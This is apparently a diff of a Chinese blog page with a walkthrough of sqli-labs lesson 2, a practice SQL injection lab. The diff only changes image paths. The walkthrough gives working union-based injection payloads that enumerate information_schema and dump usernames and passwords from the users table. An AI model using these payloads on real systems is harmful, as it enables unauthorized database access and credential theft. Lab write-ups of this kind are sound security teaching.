@@ -193,54 +193,54 @@
     <div class="content-article">
         <h1 id="sql-labs-t2"><a href="#sql-labs-t2" class="headerlink" title="sql-labs-t2"></a>sql-labs-t2</h1><p><strong>注：同t1思路完全相同，仅注入点不同。可以不看此题解</strong></p>
 <h3 id="一、观察题目"><a href="#一、观察题目" class="headerlink" title="一、观察题目"></a>一、观察题目</h3><p>同t1的提示，提交id&#x3D;1进行尝试</p>
-<p><img src="/sqli-labs-2/image-20220323170558808.png" alt="image-20220323170558808"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323170558808.png" alt="image-20220323170558808"></p>
 <p>同t1思路，尝试寻找注入点</p>
 <h3 id="二、寻找注入点"><a href="#二、寻找注入点" class="headerlink" title="二、寻找注入点"></a>二、寻找注入点</h3><p>提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure>
 
 <p>发现提示信息有and 1&#x3D;1 –  ，因此尝试推测为整形注入点</p>
-<p><img src="/sqli-labs-2/image-20220323170747547.png" alt="image-20220323170747547"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323170747547.png" alt="image-20220323170747547"></p>
 <p>进行尝试，提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1 --+</span><br><span class="line">id=1 and 1=2 --+</span><br></pre></td></tr></table></figure>
 
 <p>发现存在注入点</p>
-<p><img src="/sqli-labs-2/image-20220323171023641.png" alt="image-20220323171023641"></p>
-<p><img src="/sqli-labs-2/image-20220323171059800.png" alt="image-20220323171059800"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323171023641.png" alt="image-20220323171023641"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323171059800.png" alt="image-20220323171059800"></p>
 <h3 id="三、查找表的结构"><a href="#三、查找表的结构" class="headerlink" title="三、查找表的结构"></a>三、查找表的结构</h3><p>同t1，先对表单属性个数进行测试</p>
 <p>提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by [num]--+</span><br></pre></td></tr></table></figure>
 
 <p>同样到4时进行报错，推测有三个元素</p>
-<p><img src="/sqli-labs-2/image-20220323171543166.png" alt="image-20220323171543166"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323171543166.png" alt="image-20220323171543166"></p>
 <p>对输出进行测试</p>
 <p>提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
 
 <p>得出输出样式，同样是2，3位置可以输出。</p>
-<p><img src="/sqli-labs-2/image-20220323171639418.png" alt="image-20220323171639418"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323171639418.png" alt="image-20220323171639418"></p>
 <p>获取数据库信息</p>
 <p>提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(database()),3--+</span><br></pre></td></tr></table></figure>
 
 <p>可知此数据库为security</p>
-<p><img src="/sqli-labs-2/image-20220323171825578.png" alt="image-20220323171825578"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323171825578.png" alt="image-20220323171825578"></p>
 <p>之后在information_schema表中查找数据库表信息</p>
 <p>提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
 
 <p>找到数据库表名信息</p>
-<p><img src="/sqli-labs-2/image-20220323174930569.png" alt="image-20220323174930569"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323174930569.png" alt="image-20220323174930569"></p>
 <p>根据表名查询表内属性</p>
 <p>提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
 
 <p>获得属性名称</p>
-<p><img src="/sqli-labs-2/image-20220323175456459.png" alt="image-20220323175456459"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323175456459.png" alt="image-20220323175456459"></p>
 <p>对信息查询</p>
 <p>提交</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure>
 
-<p><img src="/sqli-labs-2/image-20220323180226570.png" alt="image-20220323180226570"></p>
+<p><img src="/2022/03/23/sqli-labs-2/image-20220323180226570.png" alt="image-20220323180226570"></p>
 
     </div>
 </article>
